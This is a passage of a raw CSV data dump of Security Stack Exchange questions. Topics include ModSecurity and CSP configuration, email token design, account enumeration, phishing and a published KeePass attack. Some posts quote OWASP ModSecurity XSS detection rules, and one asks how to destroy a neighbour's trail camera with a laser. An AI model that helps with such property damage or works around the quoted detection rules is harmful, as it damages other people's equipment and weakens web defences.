","173701","","29252","","2020-02-12 13:38:38","2020-02-13 22:59:32","Are there joint password accounts? (Like bank accounts)","<passwords><account-security><password-policy>","8","15","","","","CC BY-SA 4.0"
"157374","1","","","2017-04-14 00:08:58","","2","296","<p>I am using:
apache2-2.4.25-5.1.x86_64
apache2-mod_security2-2.9.0-6.1.x86_64</p>

<blockquote>
  <p>Apr 13 18:59:36 mail start_apache2[16810]: AH00526: Syntax error on
  line 1 of /etc/apache2/mod_security2.d/crs_whitelist.conf:</p>
  
  <p>Apr 13 18:59:36 mail start_apache2[16810]: ModSecurity: Execution phases
  can only be specified by chain starter rules.</p>
</blockquote>

<pre><code>SecRule REMOTE_ADDR ""@ipmatch 192.168.3.0/24""   ""phase:1,t:none,nolog,noauditlog,ctl:ruleRemovebyID=920350,id:999001""
</code></pre>

<p>I am trying to prevent logging of certain rules when accessing my web server locally.</p>

<p>Modsecurity cause apache not to start because of above error.</p>
","37430","","","","","2022-10-03 22:42:17","apache modsecurity SecRule ipmatch errors","<linux><apache><mod-security>","1","0","0","","","CC BY-SA 3.0"
"157385","1","","","2017-04-14 06:31:21","","1","343","<p>Last night my friend's Skype account(which he stopped using 3 years ago) sent all of his contacts a web spoofed message in the following format
<code>www.google.com/something/something/... id=</code> with the receivers ID appended.</p>

<p>When I view it from Android I just see this link. When my other friend clicked it he said he saw an ad page and whenever he tried to click back another add popped up but nothing seemed to be downloaded.</p>

<p>What is the worst thing that can happen? If the phone is infected will it infect the pc when it is connected via a usb cable? If the phone is infected, is converting back to the factory settings a solution?</p>

<p>When I view it from my pc the title of the link becomes:</p>

<blockquote>
  <p>Hoe IK (some money) Verdiende in 26 Dagen Zonder Ook Maar en Dubbeltje Uit Te Geven.</p>
</blockquote>

<p>Translation:</p>

<blockquote>
  <p>How I earned (amount) in 26 days without spending a dime.</p>
</blockquote>
","145762","","","user13695","2017-04-14 09:02:47","2017-04-20 06:42:37","Clicking a spoofed message customised to receivers id from Android","<account-security><spoofing>","0","0","","","","CC BY-SA 3.0"
"157413","1","","","2017-04-14 20:22:19","","1","128","<p>I'm making a game with a library called Processing.js. This library has two built in functions that allow me to save and retrieve information from a .txt file. But when I tried to use this functions to retrieve scores, it didn't work. I checked the console and found the following error message:</p>

<p><em>Refused to connect to '[url]' because it violates the following Content Security Policy directive: ""default-src 'none'"". Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.</em></p>

<p>I'm very new to web development and have no idea what this means.</p>

<p>Can anyone help me? Thanks in advanced</p>
","145796","","","","","2017-04-14 20:22:19","Getting the following error: default-src 'none'","<content-security-policy>","0","4","","2017-04-17 16:47:32","","CC BY-SA 3.0"
"225752","1","","","2020-02-12 03:31:41","","1","169","<p>I'm a newbie to software security. I'm designing a network and I was wondering is it possible to detect if a program upgrade being downloaded on the network is malicious just by analyzing the structure of the downloaded executable? </p>

<p>I tried some literature search but couldn't find much. Any help is highly appreciated.  Thank you!</p>
","226937","","226937","","2020-02-12 15:32:09","2020-02-12 15:53:52","Is it possible to detect malicious software just by analyzing the code structure?","<network><code-execution><security-by-design>","4","1","","","","CC BY-SA 4.0"
"157546","1","","","2017-04-18 04:47:23","","1","167","<p>I was woken today at <em>05:15</em> by a phone call from my bank, notifying me that the PIN number is XXXX. <br>I <strong>did not ask</strong> to change my PIN number, and actually, have not accessed the bank account electronically in a while.</p>

<p>I then checked my email and noticed that my guru.com account was accessed, and is now locked due to failure to answer the security questions correctly. Needless to say, <strong>it wasn't me</strong> who tried to access the guru.com account.</p>

<p>This attempt was made at <em>02:41</em> from <em>Dhaka, Bangladesh,</em> from IP Address <em>123.108.246.44</em> (the ISP for this IP is GrameenPhone (widely abbreviated as GP, is the leading telecommunications service provider in Bangladesh)). I <strong>do not</strong> reside in Bangladesh.</p>

<p><strong>Any suggestions how to proceed, besides the obvious changing of credentials?</strong></p>
","82815","","","","","2017-04-18 05:03:10","How to proceed after attempted cracking to accounts?","<passwords><password-cracking><account-security><credentials><account-lockout>","2","4","","2017-04-19 14:51:13","","CC BY-SA 3.0"
"225947","1","230284","","2020-02-15 15:27:58","","0","174","<p>As far as I understand, Identity sends to the user an encrypted token with some user information like the user name and expiration date. Then, when a new request arrives to the server, it decrypts it and will have available all the user claims and some other information.</p>

<p>My question is, in case there is no need to send the authetication information to other servers (for example if you are authenticating against another web site) would it be more safe not to send as much information to the user? Perhaps we can just send a large code to the user and then match it with an in memory collection or database.</p>

<p>I know that if someone is able to intercept that code she will be able to also make valid requests, but when the ""ticket"" expires it will not longer be valid for anyone until making the login process again. However, if that code is compromised there won´t be any other information than that.</p>

<p>I hope I am being clear with my question, if not, please let me know it so I can improve it.</p>
","200513","","","user163495","2020-02-15 15:51:25","2020-04-21 23:05:09","Why ASP.Net Identity sends sensitive information to clients?","<web-application><account-security><.net><asp.net><asp.net-mvc>","1","3","","","","CC BY-SA 4.0"
"226097","1","","","2020-02-19 02:55:36","","0","89","<p>I came to know that the malicious activities will be carried out only by a software(program) whereas the malicious files(data to the softwares installed in the system) can't perform the malicious activities directly by themselves but they can responsible for bringing those malicious softwares to the system( say like steganography).Hence those softwares also must be installed ( automatically or manually) before performing their activity.</p>

<p>If this is true scanning for malware in softwares before they get installed( triggered manually or automatically) is enough to say that the system is 100% secure(considering that our detector is ideally 100%accurate)?</p>
","227417","","","","","2020-02-19 03:56:57","Is testing for all executables without considering any files in the system is enough for deducing whether the system is infected with malware?","<security-by-design>","1","0","","","","CC BY-SA 4.0"
"226151","1","","","2020-02-20 01:46:15","","3","771","<p>Every time I install Windows 10, I painstakingly go through every setting that can be found in any GUI setting for the OS, disabling everything that sounds creepy.</p>

<p>One of the most disturbing things I've found is what I believe is called ""<strong><em>automatic sample submission</em></strong>"", which means that the built-in anti-virus tool in Windows 10 can, by default, decide to upload any file it deems ""potentially risky"" to Microsoft, ""for further analysis"". It also mentions that it doesn't do this for files which ""may contain personal data"".</p>

<p>But how can it know that? Does it:</p>

<ol>
<li>Simply look at the file extension and only upload .EXE and other ""obvious binaries""?</li>
<li>Does it ignore the file extension and instead look inside the file to check if it contains executable code?</li>
<li>A combination of both?</li>
</ol>

<p>What happens if I have a word processing document full of private information, but which also has a malicious macro or something accidentally baked (embedded) into it?</p>

<p>What happens if I have an EXE which actually has had all data files baked into it while I'm developing a game as to be a single file? (This is an actual situation I've been in in the past.)</p>

<p>Does it deem the data files for my local PostgreSQL database full of ultra-private information as ""potentially dangerous"" and upload those?</p>

<p>I can think of numerous situations where even the smartest code in the world would not be able to determine what contains private data or not. And, frankly, I have virtually zero confidence left in Microsoft's judgment at this point, having wasted a huge amount of my life fighting the OS to be able to use it at all. I've found numerous typos in their ""stable"" releases, making me extremely scared of how much data has been uploaded in spite of all the care I've tried to take to avoid it.</p>

<p>I also remember that it eagerly wanted to re-enable this feature, even harassing me about it. I can imagine that the vast majority of users have no idea about this, let alone have gone through the trouble of force-disabling it.</p>
","227482","","","","","2020-02-20 08:37:11","How exactly does Windows Defender in Windows 10 determine when to upload your local files to Microsoft?","<windows><privacy><windows-10><security-theater>","1","0","","","","CC BY-SA 4.0"
"226174","1","","","2020-02-20 13:34:33","","16","5165","<p>I am developing a reliable system for token generation and validation used mainly for links in confirmation emails (reset password request, change email flow, activate an account, etc...).</p>

<p>There are a few things that are mandatory:</p>

<ul>
<li><p>Token must be unique (even when two generated at the same time) in system (in database)</p></li>
<li><p>Token must be one-time use</p></li>
<li>Token must have expiration</li>
<li>Token cannot be guessable</li>
</ul>

<p>From that I decided to generate token like this:</p>

<pre><code>token = sha256(user.id + time + uuid(v4) + secret)
</code></pre>

<p>This token do not need to carry any expiration information, because it is saved in database with those columns externally.</p>

<ol>
<li>Does this token meet my requirements above points? If not, how to modify my approach?</li>
<li>If this token meets my requirements, is there a way to simplify it while meeting my goals?</li>
</ol>

<p>I am asking this, because I know there are some known exploits of those types of one-time use tokens sent to email and I am not sure if I will be safe.</p>
","227518","","6253","","2020-02-20 14:04:03","2020-02-21 08:44:24","Am I generating email link tokens correctly?","<account-security><one-time-password><token>","3","5","","","","CC BY-SA 4.0"
"157971","1","","","2017-04-23 21:19:46","","5","761","<p>I'm trying to evaluate benefits of using ModSecurity in our system. From that what I read till now, I have feeling it is not very useful for us. 
In our web app, there is single entry point, which is encrypted websocket connection. That design might make all content based rules bit useless.</p>

<p>With that setup, is it worth to have ModSecurity as precaution?</p>
","139654","","32746","","2017-07-17 20:13:01","2017-07-17 20:13:01","Is it worth using ModSecurity on a single entry point websocket connection?","<apache><mod-security><websocket>","1","4","","","","CC BY-SA 3.0"
"90874","1","","","2015-06-04 16:54:54","","-5","7579","<p>My neighbor presently has a version of a Stealth Cam P12 6 MP Trail Camera 9 (see link below) pointed directly into my windows.  Rather than get into a legal argument (the authorities where I live won't care and I am not in the habit on contacting the police unless it is life-or-death), can I permanently disable this kind of camera by burning out the CMOS with a green Laser Pointer Pen 532 nM?</p>

<p>IF not, are there any other suggestions on how I might disable it without trespassing?</p>

<p><a href=""http://www.cabelas.com/product/Stealth-Cam-P-MP-Trail-Camera/1816967.uts?productVariantId=3889805&amp;srccode=cii_17588969&amp;cpncode=41-52786984-2&amp;WT.tsrc=CSE&amp;WT.mc_id=GoogleProductAds&amp;WT.z_mc_id1=03913739&amp;rid=20"" rel=""nofollow"">http://www.cabelas.com/product/Stealth-Cam-P-MP-Trail-Camera/1816967.uts?productVariantId=3889805&amp;srccode=cii_17588969&amp;cpncode=41-52786984-2&amp;WT.tsrc=CSE&amp;WT.mc_id=GoogleProductAds&amp;WT.z_mc_id1=03913739&amp;rid=20</a></p>
","77956","","","","","2015-06-04 17:40:39","How to disable a trail camera with a laser","<security-theater>","1","5","","2015-06-05 07:54:20","","CC BY-SA 3.0"
"226334","1","226335","","2020-02-24 02:18:09","","2","349","<p>There's lots of information on using one email for multiple accounts, but how about the other way around? I'm building a service and considering allowing users to log in with any of their registered emails, using the same password for all of them. Instead of a ""my account is my email"" mindset, I'm going for a ""my account has emails that I can use to access my account"" mindset.</p>

<p>Aside from increasing the discoverable routes of entry for an attacker, are there any security downsides to this?</p>
","214758","","","","","2020-02-24 13:48:19","Downsides of allowing multiple emails per user?","<authentication><account-security>","3","0","","","","CC BY-SA 4.0"
"158075","1","158081","","2017-04-25 12:41:56","","79","32283","<p>According to the <a href=""https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md#authentication-and-error-messages"" rel=""noreferrer"">OWASP Auth Guidelines</a>, ""An application should respond with a generic error message regardless of whether the user ID or password was incorrect. It should also give no indication to the status of an existing account.""</p>

<p>However, I have found that many popular web apps violate this guideline by showing a message that the account does not exist.</p>

<hr>

<p><img src=""https://i.stack.imgur.com/MPtj3.jpg"" alt=""google""></p>

<hr>

<p><img src=""https://i.stack.imgur.com/O7tfs.png"" alt=""microsoft""></p>

<hr>

<p><img src=""https://i.stack.imgur.com/mg2E6.png"" alt=""slack""></p>

<hr>

<p>So what is going on here? Are Google, Microsoft, and Slack doing something insecure or is the OWASP Guideline useless?</p>
","11536","","34516","","2019-03-13 20:31:36","2019-03-13 20:31:36","Is it unsafe to show message that username/account does not exist at login?","<authentication><account-security><user-enumeration>","7","12","","2017-04-27 16:50:34","","CC BY-SA 4.0"
"158219","1","","","2017-04-26 20:45:29","","0","134","<p>I have been trying to encrypt media(Video and audio content) from a nodejs server to a client like android or iOS. I heard of DRM but could not get a reliable implementation of DRM. </p>

<p>I wanted to make my own implementation of protecting my content, But am not sure issues i would have with my implementation.</p>

<p><strong>THIS IS MY IMPLEMENTATION.</strong></p>

<p>Clients like android would first get authenticated from my server, then my server would pass a token to the android client, then this android client would request for the protected media with some request like </p>

<p><code>/get/video/:id/:token</code></p>

<p>Where <code>id</code> is the video content id and the <code>token</code> in this case is like the key, if the client doesn't have a valid token then the data will not be given to client.</p>

<p><strong>QUESTION:</strong> Will this implementation work, can it protect my content from unauthorised clients, what are some of the drawbacks of using this?</p>
","146764","","","","","2017-04-27 04:52:34","Media content protection","<drm><security-by-design>","1","3","","2017-04-28 17:01:33","","CC BY-SA 3.0"
"158221","1","","","2017-04-26 20:54:38","","3","1279","<p>I recently saw this new attack on KeePass (see <a href=""http://www.slideshare.net/harmj0y/a-case-study-in-attacking-keepass"" rel=""nofollow noreferrer"">here</a> and the <a href=""http://github.com/HarmJ0y/KeeThief"" rel=""nofollow noreferrer"">source code</a>). I don't know how to use this attack (I'm a newbie to these things), so I want to know:</p>

<ol>
<li>How can this attack be used?</li>
<li>What does this mean for personal computer users?</li>
</ol>

<hr>

<p><sub>I understand that one question might be answered by an answer to the other, but any help understanding this would be appreciated.</sub></p>
","","user125213","61443","","2017-04-27 06:58:27","2018-10-18 22:12:32","Attacking KeePass","<passwords><account-security><keepass>","2","0","","","","CC BY-SA 3.0"
"17626","1","","","2012-07-25 09:09:41","","1","857","<p>I have a question regarding mod_security. I have installed mod_security on my server and OWASP core rule set. However, now people are having trouble when accessing my page.</p>

<p>For example, one problem is that images are not displayed because they're raising a mod_security patterns. So my question is, Can I somehow disable mod_security patterns for file names?</p>
","11590","","971","","2012-07-25 19:05:48","2012-08-08 05:56:56","Exclude file names from mod_security patterns","<firewalls><apache><owasp><mod-security>","1","1","","","","CC BY-SA 3.0"
"91250","1","","","2015-06-10 07:01:49","","2","169","<p>Suppose $S$ is a set of known websites which are very important. Assume there is an anti-phishing tool company $A$ which is aware of such websites. Can the company A reliably develop an anti-phishing tool just to distinguish the websites of set $S$ from its complement $S'$? In other words is it possible for the anti-phishing tool to notify its users if the currently visited website is from set $S$ or set $S'$?</p>

<p>I think this problem is relatively easy as the anti-phishing tool has to distinguish between set $S$ of known websites from the complement set $S'$. Or can such anti-phishing tool can be fooled?</p>

<p>Another related question:
Assume that the number of websites over the internet remains same over the time (static) and anti-phishing tool company A knows the set of legitimate websites $S$ and illegitimate websites $S'$. Is it possible to prevent phishing by distinguishing the set $S$ from the set $S'$, for example by blacklisting the sites in $S'$ or by allowing connection only to sites in $S$?</p>
","55595","","55595","","2015-06-10 10:12:16","2015-06-10 15:38:22","Preventing phishing of few critical websites","<attack-prevention><phishing><security-theater>","4","3","","","","CC BY-SA 3.0"
"226610","1","","","2020-02-29 16:50:43","","0","887","<p>An unknown Google account is signed into Firefox on my Arch Linux machine. The computer is in my apartment (where I live alone) and I lock the screen when I leave.</p>

<p>Some observations:</p>

<ul>
<li>The unknown account is has a domain of <code>@pages.plusgoogle.com</code> and a random-number-looking user name.</li>
<li>The ""Signing in to Google"" page for the unknown account shows no password option: <a href=""https://i.stack.imgur.com/5oYQu.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5oYQu.png"" alt=""shows no password option""></a>.</li>
<li>The Google Timeline for the unknown account is the same as my real account.  </li>
<li>The unknown account is now NOT showing up in new tabs when selecting a Google account, however, I still have tabs open that are logged into the unknown account.</li>
<li>The only machine listed under my devices in the unknown account's ""Your devices"" section is the current Arch Linux machine.</li>
<li>My real account has 2FA using the Google Authenticator app (and the backup codes are unused and unchanged)</li>
<li>My real account shows no unknown devices logged in</li>
</ul>

<p>Searching for things like ""unknown Google account logged into laptop browser"" only results in suggestions that someone has gained physical access to your laptop. This is of course not impossible, but it is unlikely. Has someone broken in to my apartment or my wifi/lan?</p>

<p>My question is to ask people's advice or thoughts here. I am a software engineer but I only have rudimentary security knowledge at best.</p>
","228121","","","","","2020-02-29 17:17:41","Unknown Google Account Signed into Browser","<wifi><account-security><google><firefox><lan>","1","1","","","","CC BY-SA 4.0"
"226663","1","","","2020-03-02 04:34:02","","3","1012","<p>Which is harder to exploit:
Password reset link with tokens/timestamps/code/ticket etc
Or, temporary password sent on user mail using which login can be done and password can be changed.</p>

<p>Any suggestions on how they can be exploited please? </p>
","228198","","6253","","2023-09-30 12:24:40","2023-09-30 12:24:40","Password reset link vs Temporary password","<account-security><one-time-password><password-reset>","3","3","","","","CC BY-SA 4.0"
"226784","1","226785","","2020-03-04 01:11:26","","0","515","<p>This problem is completely <em>different</em> from ""running malware in a VM""! Suppose I want to have a virtual machine running some software with secret data. But I do not have complete control of the host machine, i.e. hackers can happily play on the host machine. Then, is it possible that my VM is still safe? For instance, without knowing the password, the hackers can never see what is inside the VM even though they get control of the host?</p>

<p>(P.S. Maybe by using some kind of full-disk encryption? But what about the memory... And when the VM is executing commands, the host can see that, cannot it?)</p>

<p>Thanks for any ideas!</p>
","228027","","","","","2020-03-04 16:15:51","Creating secure virtual machine that nobody can see its content including the host machine?","<linux><account-security><virtualization>","1","5","","2020-03-04 03:03:01","","CC BY-SA 4.0"
"18022","1","18269","","2012-08-02 04:08:02","","1","522","<p>Following are the two Rules taken from ModSecurity CRS core Ruleset. These two rules are base Rules for XSS attacks. If we look at these two rules their variables and actions are same what they differ in their regular expression i.e. \bgetparentfolder\b"" and \bonmousedown\b\W*?\="" and found huge number of such rules. Is this a redundancy ? Can i combine these rules i.e single Regular expression?</p>

<blockquote>
  <p>SecRule
  REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* ""\bgetparentfolder\b"" \
    ""phase:2,rev:'2.2.4',capture,t:none,t:htmlEntityDecode,t:compressWhiteSpace,t:lowercase,ctl:auditLogParts=+E,block,msg:'Cross-site
  Scripting (XSS)
  Attack',id:'958016',tag:'WEB_ATTACK/XSS',tag:'WASCTC/WASC-8',tag:'WASCTC/WASC-22',tag:'OWASP_TOP_10/A2',tag:'OWASP_AppSensor/IE1',tag:'PCI/6.5.1',logdata:'%{TX.0}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.xss_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/XSS-%{matched_var_name}=%{tx.0}""</p>
  
  <p>SecRule
  REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* ""\bonmousedown\b\W*?\="" \
    ""phase:2,rev:'2.2.4',capture,t:none,t:htmlEntityDecode,t:compressWhiteSpace,t:lowercase,ctl:auditLogParts=+E,block,msg:'Cross-site
  Scripting (XSS)
  Attack',id:'958414',tag:'WEB_ATTACK/XSS',tag:'WASCTC/WASC-8',tag:'WASCTC/WASC-22',tag:'OWASP_TOP_10/A2',tag:'OWASP_AppSensor/IE1',tag:'PCI/6.5.1',logdata:'%{TX.0}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.xss_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/XSS-%{matched_var_name}=%{tx.0}""</p>
</blockquote>
","11801","","","user10211","2012-08-02 04:16:22","2012-08-08 05:43:26","Web Application Firewall Rule Optimization","<web-application><firewalls><xss><mod-security><waf>","1","1","0","","","CC BY-SA 3.0"
"226901","1","226902","","2020-03-05 17:48:03","","2","359","<p>I believe many will benefit from this as there is not clear answer online and I keep making my policies too strong and locking myself out from accessing the LAN admin panel.</p>

<p>What would be the absolute strongest security settings without locking myself out on the Firewall Zone settings. </p>

<p>The settings go as follows and the options are either accept, reject, or drop. Could someone explain each of the categories so I know what is happening in each and what it is used for? I want to specify that I want to block all inbound connections as I do not have a need for them (close all uneccessary ports and exterior ports that are for inbound connections/remote connections)</p>

<p>This is the panels format:</p>

<p>Zone. Input Output Forward</p>

<p>LAN.  Option Option. Option</p>

<p>WAN.  Option. Option Option</p>

<p>Guest Option. Option Option</p>

<p>OVPN. Option. Option. Option</p>
","225371","","","","","2020-03-05 18:18:29","Best Firewall Zone Settings for Security Gli-net Routers","<network><firewalls><router><content-security-policy><network-access-control>","1","0","","","","CC BY-SA 4.0"
"226906","1","","","2020-03-05 19:39:29","","2","288","<p>I'm implementing my JWT method by using the double submit method: where we separate the payload &amp; header portion of the JWT from the signature.</p>

<p>The header &amp; payload is stored in a separate cookie, not HttpOnly so its accessible by the client, and the signature is HttpOnly.</p>

<p>The implementation seems pretty straight forward, but I'm having an issue understanding how refresh works.</p>

<p>For example, since I'm using firebase, the users jwt token has an expiration of 1 hour. When that expires, we need to automatically refresh the token, but this means we are refreshing the whole token. The whole point of the signature token is to be session long. </p>

<p>How can we refresh just the payload &amp; header part of the token, without it affecting the signature?</p>

<p>The strategy I am using is based on this article:
<a href=""https://medium.com/lightrail/getting-token-authentication-right-in-a-stateless-single-page-application-57d0c6474e3"" rel=""nofollow noreferrer"">https://medium.com/lightrail/getting-token-authentication-right-in-a-stateless-single-page-application-57d0c6474e3</a></p>
","175487","","175487","","2020-03-05 20:29:34","2020-08-02 21:02:30","Double JWT submit method","<web-application><account-security><session-management><jwt><react>","1","0","","","","CC BY-SA 4.0"
"227089","1","","","2020-03-10 14:53:32","","1","241","<p>I understand CSP can be beneficial against multiple attack vectors (i.e clickjacking, XSS), but as it specifically relates to XSS -- why is it a solution? </p>

<p>My reason for asking this question stems from a question that i was recently asked. ""If input sanitization / output encoding always works, then why has XSS still a thing?""</p>

<p>My initial thoughts were: Because it's not always that simple. XSS can come in multiple contexts, in different forms, etc and CSP (if done correctly) can be an easy way to prevent this. I have primarily always viewed it as a defense in depth measure that should never be used as the sole mechanism against XSS. </p>

<p>With that being said, are there any cases where sanitize input / encode output isn't sufficient against XSS? </p>
","182339","","","","","2022-10-26 13:43:01","Why CSP vs XSS?","<xss><content-security-policy>","1","3","","","","CC BY-SA 4.0"
"18179","1","18190","","2012-08-06 05:54:35","","2","517","<p>For Network Layer Firewalls we have different sort of redundancy and consistency checks like rule shadowing, that can impact the performance of firewall. Do similar kind of checks can be applied on WAFs, i have some questions ?</p>

<ol>
<li>Does order of Rules matter ?</li>
<li>How inconsistent rules are handle.</li>
<li>How redundancy is removed from the ruleset </li>
<li>Can rules be bypassed for static application layer signatures</li>
</ol>
","11801","","","","","2012-08-07 06:49:38","Web Application Firewall Rules","<web-application><firewalls><mod-security><waf>","2","1","","","","CC BY-SA 3.0"
"18185","1","18187","","2012-08-06 11:10:00","","1","393","<p>We have networked camera on my house. My brother is protected by user name and password. When I check my network in laptop, I can see the networked camera in my network but when I click to open, it direct to the webpage <code>10.143.210.12/index.htm</code> and asking me user name and password.</p>

<p>I tried by using different ports, e.g. <code>http:// 10.143.210.12:800</code>, <code>:443</code>, <code>:8080</code> etc.. (still asking me user name and password). I doubt that someone (guest) who is using our home network can hack into our networked camera.</p>

<p>Is that possible to crack it in? Does being in the same network make it more easy to crack the camera or still the same security strength?</p>
","5261","","5400","","2012-08-06 11:12:44","2012-08-06 11:25:39","Can I bypass my own networked camera?","<network><security-theater>","1","0","","","","CC BY-SA 3.0"
"227181","1","","","2020-03-12 09:59:38","","0","305","<p>At the moment, there aren't any of those vulnerabilities that we know. I was looking the docs on what damages can be done by hackers if apache tomcat favicon is revealed in web application.</p>
","228863","","","","","2023-07-26 02:09:11","How apache tomcat favicon can be malicious or cause unintended results in application?","<web-application><appsec><apache><mod-security><tomcat>","1","0","","","","CC BY-SA 4.0"
"91802","1","91823","","2015-06-16 20:46:14","","4","476","<p>Recently, I was working on a computer system for a model railroad club.  This computer system is capable of monitoring and controlling the positions of all the (physical) trains which could be anywhere on the track layout.</p>

<p>However, someone recently came in and criticized the system for not running in a password-protected, locked-down account.  He even went so far as to suggest adding a BIOS password.</p>

<p>However, I countered that argument by saying that anything that someone could do damage by via computer could be done just as easily by picking up a hammer.  By the time that someone would be able to exploit the fact that the computer had no password, they could have already done the same level of damage.</p>

<p>Were his concerns legitimate, or was he taking things too far?</p>
","78741","","49936","","2015-06-16 21:19:31","2015-06-17 15:01:00","Do I need to secure a computer from physical attacks when attackers can already harm in many other ways?","<physical><security-theater>","5","18","","","","CC BY-SA 3.0"
"227272","1","","","2020-03-13 21:48:58","","5","397","<p>I understand the necessity of using VPN when connecting to the work network from the outside.
What I want to know is there any benefit for a strictly consumer computer that is connected to the internet but only for non-work things? Does it protect against viruses or people taking over your computer for example?</p>
","228964","","","","","2020-03-19 15:12:49","Is Using VPN Useful For Strictly Personal Use?","<vpn><account-security>","3","2","","","","CC BY-SA 4.0"
"18483","1","","","2012-08-10 14:21:07","","0","191","<p>how much is reasonable if i'm looking to hire someone FULL TIME to handle security auditing and patching for my network?  I need my network to be PCI Compliance and what not as well.  MY office have about 15 workstations that consists of Sales Dept, Accounting Dept, and Shipping Department.  </p>

<p>i bought a SonicWall NSA security router, so the person will have to manage and monitor that along with ASP, PHP, JAVA intranet system.</p>

<p>Thanks.</p>
","12126","","","","","2012-08-10 15:53:47","How much does network security audit and patch work?","<pci-dss><security-theater>","1","4","","2012-08-10 16:03:01","","CC BY-SA 3.0"
"159138","1","159140","","2017-05-10 07:04:15","","0","552","<p>I am a system architecture working on projects - mostly CDN related projects - and I am currently a bit confused about where the IPS/IDS should be placed. We have a NGINX-based webserver for the edge which is being protected and monitored with NAXSI as its WAF. All servers are using SELinux, and they are using firewalld as their system firewall. Requests should be directly sent to the NGINX edge-server, and I am trying so hard to avoid network dumps.</p>

<p>The question is, where should the IPS/IDS be placed. Should it be on the edge-server itself or it should be on another machine? Performance is the most essential consideration that we should have.</p>

<pre><code>|          |
|          |                            ---&gt;&gt; OTHER SERVERS
| FIREWALL |                           /
|          |                          /
|          |  ----&gt;&gt;&gt;    NGINX EDGE  ------&gt;&gt; OTHER SERVERS
|          |                          \
|          |                           \
|          |                            ---&gt;&gt; OTHER SERVERS
|          |    
|          |   should IPS be on NGINX EDGE? Or should I add another
|          |   machine in front of NGINX EDGE - Closer to Firewall ?
</code></pre>
","118064","","118064","","2017-05-10 07:40:12","2017-05-11 17:05:39","Design and Security Architecture - where should IPS/IDS be placed?","<linux><ids><architecture><security-by-design>","2","0","","","","CC BY-SA 3.0"
"227497","1","","","2020-03-19 01:47:49","","0","313","<p>I'm logged into my school Google account at home. Can what I search at home on my own computer be checked by my school even though I'm not using their computers? </p>
","229227","","6253","","2020-03-19 07:31:23","2020-03-19 10:59:13","school google account on my school computer","<account-security><google>","1","2","","","","CC BY-SA 4.0"
"227541","1","","","2020-03-19 18:03:02","","0","22","<p>Does hashing once on clientside and once on server-side increase security when dealing with an untrustworthy server?
For example when dealing with open source projects where users can self-host their version of the service.
My thought process behind this:</p>

<ol>
<li>When only hashing clientside it's essentially sending plain passwords but with the benefit of the server not knowing the actual password which could help against a malicious server owner brute-forcing these passwords on other services (e.g Netflix) to get access to his users' accounts.</li>
<li>Hashing only serverside has the disadvantage stated above</li>
<li>So why not combine both?</li>
</ol>

<p>Is there something I am missing? Does this increase security in any way?</p>
","229281","","6253","","2020-03-19 18:16:50","2020-03-19 18:16:50","Does hashing client-side increase security when dealing with an untrustworthy server?","<passwords><hash><password-management><account-security>","0","4","","2020-03-19 18:17:43","","CC BY-SA 4.0"
"227607","1","227609","","2020-03-21 12:14:32","","2","896","<h1>Description</h1>

<p><a href=""https://www.paypal.com/us/webapps/mpp/security/secure-passwords"" rel=""nofollow noreferrer"">PayPal</a> suggests that generating a PIN by spelling words (on a numeric pad, e.g., <code>[ABC] = 2</code>) is a good method for security and memorability, e.g., <code>B-L-U-E-C-O-W = 2583269</code>.</p>

<p>My knowledge about password security is limited and I have not found any information about this. While these PINs are not completely random it seems to me that they should be (depending on words) quite secure†, at least for what PINs usually protect (just 4--8 numbers) and with other measures such limited attempts.</p>

<p><em>† I just realized that 0 and 1 are not mapped to letters, so those might have to be interspersed at random.</em></p>

<h1>Questions</h1>

<ol>
<li><p>Can anything be said directly about the security of PINs that spell
out words?</p></li>
<li><p>Has any research or attacks been made regarding these kinds of PINs?</p></li>
</ol>
","178921","","178921","","2020-03-21 13:03:13","2020-03-21 13:31:13","Security of PIN that spells out words?","<authentication><passwords><password-cracking><account-security>","1","3","","","","CC BY-SA 4.0"
"92167","1","92169","","2015-06-22 12:38:24","","14","35678","<p>Is it safe to auto fill credit card numbers using Chrome? Does it safely store the credit card information? As far as my understanding goes, it just shows asterisk values but on click it reveals the credit card numbers:</p>

<p><img src=""https://i.stack.imgur.com/Kk5XI.gif"" alt=""enter image description here""></p>

<p>My questions are a few :</p>

<ol>
<li><p>Is it possible for to breach Google Chrome and take my credit card information?</p></li>
<li><p>As per my understanding the credit card number is not stored with any type of encryption, so is it really secure to store in autofill data?</p></li>
</ol>

<p>How does Chrome handles this type of data? I agree it's good in terms of usability to store and fill the credit card details, but I doubt its not good in terms of security.</p>
","11679","","5405","","2015-06-22 13:32:39","2016-06-05 11:18:45","Is it safe to auto-fill credit card numbers using Chrome?","<encryption><attack-prevention><credit-card><security-theater>","3","2","","","","CC BY-SA 3.0"
"92217","1","","","2015-06-23 07:59:17","","1","138","<p>I went to check my email at work, when I types in my password, net nanny appeared saying Adult/mature content was being seen. I had to click continue in order to go forward and sign out. Even after I clicked sign out the net nanny appeared again saying the same thing and I had to click continue in order to sign out of my email. Does this mean someone from my work will be alerted and be able to see all my personal emails, photos/videos, and history that could get me in trouble? Like an automatic screen reader of my emails?</p>
","79198","","","","","2015-06-23 11:48:12","Work using net nanny","<content-security-policy>","2","11","","2015-06-26 06:54:06","","CC BY-SA 3.0"
"159393","1","159394","","2017-05-14 01:33:23","","3","1238","<p>I have a site built with <a href=""https://amp.dev"" rel=""nofollow noreferrer"">AMP</a>.</p>
<p>I tried to use <code>Content-Security-Policy: script-src 'self'</code>, but all styles and designs didn't show properly since they are loaded from <code>cdn.ampproject.org</code>.</p>
<p>Google, in their AMP documentation, says that all Content Security Policy has been handled before stored in their repository.</p>
<p>Is there a solution?</p>
","68845","","124928","","2021-04-22 21:35:08","2021-04-23 09:18:37","Using Content Security Policy in AMP-HTML pages?","<content-security-policy>","3","0","","","","CC BY-SA 4.0"
